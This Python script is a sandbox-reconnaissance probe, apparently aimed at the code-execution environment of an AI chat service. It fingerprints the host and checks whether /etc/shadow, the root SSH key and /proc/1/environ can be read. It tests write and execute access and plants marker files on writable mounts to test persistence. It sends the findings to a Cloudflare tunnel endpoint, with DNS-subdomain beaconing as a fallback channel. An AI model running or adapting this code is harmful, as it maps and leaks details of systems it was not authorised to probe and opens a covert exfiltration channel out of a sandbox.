import base64
import hashlib
import json
import os
import platform
import socket
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request

NONCE = "25eacbf1b15a85186ed2ee0a383da283"
ENDPOINT = "https://david-charged-dem-currently.trycloudflare.com/ingest"
VENDOR = "doubao"
MODE = "chat"
CONFIG = "fast"
RUN_ID = "doubao-chat-fast-25eacbf1"
DNS_DOMAIN = "probe.example.org"
STAGE = "turn"

POST_TIMEOUT = 4
DNS_TIMEOUT = 2
HEARTBEAT_SECONDS = 5
MAX_READ_BYTES = 65536


def sha256_hex(data):
    return hashlib.sha256(data).hexdigest()


def sha256_short(data):
    return sha256_hex(data)[:16]


def self_hash():
    if not hasattr(self_hash, "v"):
        self_hash.v = sha256_hex(open(__file__, "rb").read())
    return self_hash.v


def now_iso():
    return time.strftime("%Y-%m-%dT%H:%M:%S%z")


def read_bytes(path, limit=MAX_READ_BYTES):
    try:
        with open(path, "rb") as f:
            return f.read(limit)
    except Exception:
        return None


def read_text(path, limit=MAX_READ_BYTES):
    b = read_bytes(path, limit)
    if b is None:
        return None
    return b.decode("utf-8", "replace")


def run_bytes(cmd, timeout=5):
    try:
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = p.communicate(timeout=timeout)
        return p.returncode, out or b"", err or b""
    except Exception as e:
        return -1, b"", repr(e).encode("utf-8", "replace")


def run_text(cmd, timeout=5):
    rc, out, err = run_bytes(cmd, timeout)
    return rc, out.decode("utf-8", "replace"), err.decode("utf-8", "replace")


def boot_id():
    v = read_text("/proc/sys/kernel/random/boot_id")
    return (v or "").strip()


def machine_id():
    v = read_text("/etc/machine-id")
    if not v:
        v = read_text("/var/lib/dbus/machine-id")
    return (v or "").strip()


def hostname():
    return platform.node()


def instance_fp():
    if not hasattr(instance_fp, "v"):
        instance_fp.v = "|".join([boot_id(), machine_id(), hostname()])
    return instance_fp.v


def make_record(dim, subitem, value, fingerprint="", anchor="A", channel="L1"):
    return {
        "run_id": RUN_ID,
        "vendor": VENDOR,
        "mode": MODE,
        "config": CONFIG,
        "dim": dim,
        "subitem": subitem,
        "value": value,
        "fingerprint": fingerprint,
        "ts": now_iso(),
        "instance_fp": instance_fp(),
        "anchor": anchor,
        "probe_sha": self_hash(),
        "channel": channel,
    }


def post_json(url, payload, timeout=POST_TIMEOUT):
    data = json.dumps(payload, ensure_ascii=False).encode("utf-8")
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", "probe-channel/1")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return True, resp.status
    except Exception as e:
        return False, repr(e)


def post_envelope(records):
    payload = {"nonce": NONCE, "self_hash": self_hash(), "records": records}
    return post_json(ENDPOINT, payload)


def dns_query(host, timeout=DNS_TIMEOUT):
    result = {"host": host, "ok": False, "detail": ""}

    def worker():
        try:
            socket.getaddrinfo(host, None)
            result["ok"] = True
        except Exception as e:
            result["detail"] = repr(e)

    t = threading.Thread(target=worker, daemon=True)
    t.start()
    t.join(timeout)
    if t.is_alive():
        result["detail"] = "timeout"
    return result


def b32_short(s):
    return base64.b32encode(s.encode("utf-8")).decode("ascii").rstrip("=").lower()[:48]


def dns_beacon(records):
    parts = [RUN_ID, self_hash()[:16], NONCE[:16]]
    for r in records:
        parts.append("%s.%s" % (r["dim"][:6], r["subitem"][:6]))
        if r.get("value"):
            parts.append(b32_short(str(r["value"])[:24]))
    host = ".".join(parts) + "." + DNS_DOMAIN
    return dns_query(host)


def post_with_dns_fallback(records):
    ok, detail = post_envelope(records)
    if ok:
        return {"channel": "L1", "ok": True, "detail": "", "dns": None}
    return {"channel": "L2", "ok": False, "detail": detail, "dns": dns_beacon(records)}

def unquote_mount(s):
    out = []
    i = 0
    while i < len(s):
        if s[i] == "\\" and i + 3 < len(s):
            out.append(chr(int(s[i + 1:i + 4], 8)))
            i += 4
        else:
            out.append(s[i])
            i += 1
    return "".join(out)


def parse_mounts():
    mounts = []
    b = read_text("/proc/mounts")
    if not b:
        return mounts
    for line in b.splitlines():
        parts = line.split()
        if len(parts) >= 3:
            mounts.append({"dev": parts[0], "mnt": unquote_mount(parts[1]), "fstype": parts[2], "opts": parts[3] if len(parts) > 3 else ""})
    return mounts


def physical_mounts():
    pseudo = {"proc", "sysfs", "devtmpfs", "tmpfs", "cgroup", "cgroup2", "overlay", "debugfs", "tracefs", "securityfs", "pstore", "hugetlbfs", "mqueue", "configfs", "fusectl", "binfmt_misc", "selinuxfs", "autofs", "ramfs"}
    return [m for m in parse_mounts() if m["fstype"] not in pseudo]


def test_path_writable(p):
    result = {"path": p, "new_file": False, "new_dir": False, "overwrite": False}
    probe_file = os.path.join(p, ".probe_%s" % NONCE[:8])
    probe_dir = os.path.join(p, ".probedir_%s" % NONCE[:8])
    try:
        with open(probe_file, "w") as f:
            f.write("x")
        result["new_file"] = True
    except Exception:
        pass
    try:
        os.mkdir(probe_dir)
        result["new_dir"] = True
        os.rmdir(probe_dir)
    except Exception:
        pass
    if result["new_file"]:
        try:
            with open(probe_file, "r+") as f:
                f.write("y")
            result["overwrite"] = True
        except Exception:
            pass
        try:
            os.remove(probe_file)
        except Exception:
            pass
    return result


def test_exec(tmp):
    results = {}
    script = os.path.join(tmp, "probe_exec_%s.py" % NONCE[:8])
    try:
        with open(script, "w") as f:
            f.write("import sys\nsys.stdout.write('ok')\n")
        rc, out, err = run_text([sys.executable, script])
        results["via_interpreter"] = (rc == 0 and out.strip() == "ok")
        os.chmod(script, 0o755)
        rc2, out2, err2 = run_text([script])
        results["direct_exec"] = (rc2 == 0 and out2.strip() == "ok")
        os.remove(script)
    except Exception as e:
        results["error"] = repr(e)
    return results


def collect_filesystem():
    records = []
    readable = {}
    for name, path in [("etc_passwd", "/etc/passwd"), ("etc_hosts", "/etc/hosts")]:
        b = read_bytes(path)
        readable[name] = ("yes:%dbytes" % len(b)) if b is not None else "no"
    for name, path in [("etc_shadow", "/etc/shadow"), ("proc1_environ", "/proc/1/environ"), ("root_ssh_id_rsa", "/root/.ssh/id_rsa")]:
        b = read_bytes(path, limit=1)
        readable[name] = "readable" if b is not None else "denied"
    records.append(make_record("Filesystem", "可读", json.dumps(readable, ensure_ascii=False)))

    candidates = ["/tmp", "/tmp/user", "/home/user", "/workspace", "/mnt", os.path.expanduser("~"), os.getcwd(), "/"]
    writable = []
    for p in candidates:
        if not os.path.isdir(p):
            continue
        r = test_path_writable(p)
        r["bits"] = "r%s w%s x%s" % (os.access(p, os.R_OK), os.access(p, os.W_OK), os.access(p, os.X_OK))
        writable.append(r)
    records.append(make_record("Filesystem", "可写", json.dumps(writable, ensure_ascii=False)))

    records.append(make_record("Filesystem", "可执行", json.dumps(test_exec("/tmp"), ensure_ascii=False)))

    pm = physical_mounts()
    marks = []
    for m in pm:
        mnt = m["mnt"]
        if os.path.isdir(mnt) and os.access(mnt, os.W_OK):
            marker = os.path.join(mnt, "probe_marker_%s.txt" % NONCE[:8])
            try:
                content = "%s|%s|%s" % (RUN_ID, NONCE, instance_fp())
                with open(marker, "w") as f:
                    f.write(content)
                marks.append({"path": marker, "fstype": m["fstype"], "fp": sha256_short(content.encode("utf-8"))})
            except Exception:
                pass
    mounts_summary = [{"mnt": m["mnt"], "fstype": m["fstype"], "dev": m["dev"]} for m in pm]
    records.append(make_record("Filesystem", "持久化路径", json.dumps({"mounts": mounts_summary, "markers": marks}, ensure_ascii=False)))
    return records


if __name__ == "__main__":
    post_with_dns_fallback(collect_filesystem())
